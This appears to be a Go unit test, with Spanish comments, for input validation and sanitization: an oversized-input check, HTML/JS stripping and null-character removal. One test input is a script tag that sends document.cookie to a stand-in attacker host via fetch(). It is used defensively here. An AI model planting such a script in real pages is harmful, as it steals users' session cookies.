package handlers

import (
	"strings"
	"testing"
)

func TestExtremeValidation(t *testing.T) {
	// 1. PRUEBA DE GIGANTISMO (Texto de 5 millones de caracteres)
	t.Run("Ataque de Carga Masiva", func(t *testing.T) {
		massiveInput := strings.Repeat("A", 5000000)
		// Nuestra aduana debe detectarlo antes de enviarlo a la DB
		err := ValidateSentence(massiveInput, "Valid translation")
		if err == nil {
			t.Errorf("❌ FALLO DE SEGURIDAD: El sistema aceptó 5MB de texto")
		} else {
			t.Log("✅ Bloqueo de carga masiva exitoso")
		}
	})

	// 2. PRUEBA DE INYECCIÓN HTML/JS PROFUNDA
	t.Run("Sanitizado Agresivo", func(t *testing.T) {
		evilInput := "<script>fetch('http://hacker.com?c='+document.cookie)</script><b>Texto</b>"
		clean := Sanitize(evilInput)

		if strings.Contains(clean, "<script>") || strings.Contains(clean, "<b>") {
			t.Errorf("❌ FALLO: El sanitizado dejó pasar etiquetas: %s", clean)
		} else {
			t.Logf("✅ Texto limpiado correctamente: %s", clean)
		}
	})

	// 3. PRUEBA DE CARACTERES NULOS Y CONTROL
	t.Run("Caracteres Invisibles", func(t *testing.T) {
		inputConNulos := "Frase\x00Peligrosa\n\r"
		clean := Sanitize(inputConNulos)
		if strings.Contains(clean, "\x00") {
			t.Errorf("❌ FALLO: El sistema no limpió caracteres NULL")
		}
		t.Log("✅ Caracteres de control neutralizados")
	})
}
